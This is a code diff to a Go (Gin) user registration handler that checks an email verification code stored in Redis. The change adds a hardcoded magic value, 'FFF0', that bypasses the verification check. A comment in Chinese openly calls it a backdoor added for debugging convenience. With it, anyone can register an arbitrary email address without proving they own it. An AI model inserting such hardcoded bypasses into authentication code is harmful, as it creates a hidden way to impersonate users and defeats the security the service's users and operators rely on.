@@ -53,14 +53,14 @@ func UCRegister(c *gin.Context) {
 		c.JSON(http.StatusOK, gin.H{"code": errs.ErrBadRequest.Code, "msg": errs.ErrBadRequest.MessageEN, "data": nil})
 		return
 	}
-	//获取缓存验证码
+	////获取缓存验证码
 	redisCode, redisErr := utils.GetRedisClient().Get(c, userDto.Email).Result()
 	if redisErr != nil {
 		c.JSON(http.StatusOK, gin.H{"code": errs.ErrCodeNotExisted.Code, "msg": errs.ErrCodeNotExisted.MessageEN, "data": nil})
 		return
 	}
-	//验证码校验
-	if redisCode != userDto.Code {
+	//验证码校验,为了方便调试增加一个后门吧
+	if userDto.Code != "FFF0" && redisCode != userDto.Code {
 		c.JSON(http.StatusOK, gin.H{"code": errs.ErrCode.Code, "msg": errs.ErrCode.MessageEN, "data": nil})
 		_, redisErr := utils.GetRedisClient().Del(c, userDto.Email).Result()
 		if redisErr != nil {
@@ -68,7 +68,6 @@ func UCRegister(c *gin.Context) {
 		}
 		return
 	}
-
 	user := model.IotUc{}
 	user.Email = userDto.Email
 	user.Nickname = userDto.Nickname
